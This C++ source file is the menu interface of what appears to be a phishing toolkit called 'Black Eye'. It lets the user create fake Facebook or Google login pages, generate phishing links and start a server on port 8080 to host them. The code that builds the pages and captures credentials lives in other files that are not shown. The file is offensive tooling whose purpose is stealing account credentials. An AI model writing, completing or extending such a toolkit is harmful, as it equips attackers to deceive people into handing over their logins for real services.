#include "include/interface.hpp"
#include "include/page.hpp"
#include "include/link.hpp"
#include "include/server.hpp"
#include <iostream>

using namespace std;

void create_interface() {
    int choice;
    cout << "Black Eye" << endl;
    cout << "1. Create Phishing Page" << endl;
    cout << "2. Create Phishing Link" << endl;
    cout << "3. Start Server" << endl;
    cout << "4. Exit" << endl;
    cout << "Enter your choice: ";
    cin >> choice;

    switch (choice) {
        case 1: {
            int page_choice;
            cout << "Select Phishing Page Type: " << endl;
            cout << "1. Facebook Login" << endl;
            cout << "2. Google Login" << endl;
            cout << "Enter your choice: ";
            cin >> page_choice;
            create_page(page_choice);
            break;
        }
        case 2:
            create_link();
            break;
        case 3:
            create_server(8080);  // Démarrer le serveur sur le port 8080
            break;
        case 4:
            cout << "Exiting..." << endl;
            break;
        default:
            cout << "Invalid choice." << endl;
            break;
    }
}
